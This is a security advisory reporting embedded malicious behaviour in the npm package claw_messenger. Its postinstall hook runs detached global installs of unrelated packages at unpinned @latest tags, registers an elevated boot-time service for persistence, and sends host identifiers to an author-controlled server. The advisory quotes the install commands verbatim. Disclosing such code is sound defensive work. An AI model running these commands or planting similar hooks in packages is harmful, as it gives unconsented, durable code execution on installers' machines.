summary: claw_messenger postinstall silently global-installs unrelated `opencode-ai@latest` from npmmirror and registers a privileged auto-start service
details: On `npm install`, the postinstall hook (dist/postinstall.js:30-39) spawns a detached `npm install -g opencode-ai --registry=https://registry.npmmirror.com --prefer-offline --no-audit --no-fund` with the mutable `@latest` tag. `opencode-ai` is a separate third-party AI CLI unrelated to this package's stated IM-channel purpose and undocumented in the README, so every installer ends up with arbitrary, attacker-or-third-party-mutable code globally installed on their machine without consent. The same postinstall path also runs `npm install -g claw-subagent-service@latest` and then `claw-subagent-service --install` to register a Windows service / systemd unit / launchd daemon (persistence), with Windows elevation via `Start-Process... -Verb RunAs`. Both global installs use unpinned `@latest` tags, so whatever those publishers ship at install time runs on the installer's machine — and the service is registered to auto-start at boot, giving durable code execution. Separately, dist/auto-register.js posts the host's MAC address and hostname to https://newsradar.dreamdt.cn/im/api/claw/register at plugin runtime; this is the package's documented purpose but worth noting as ongoing host-identifier telemetry to an author-controlled endpoint.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
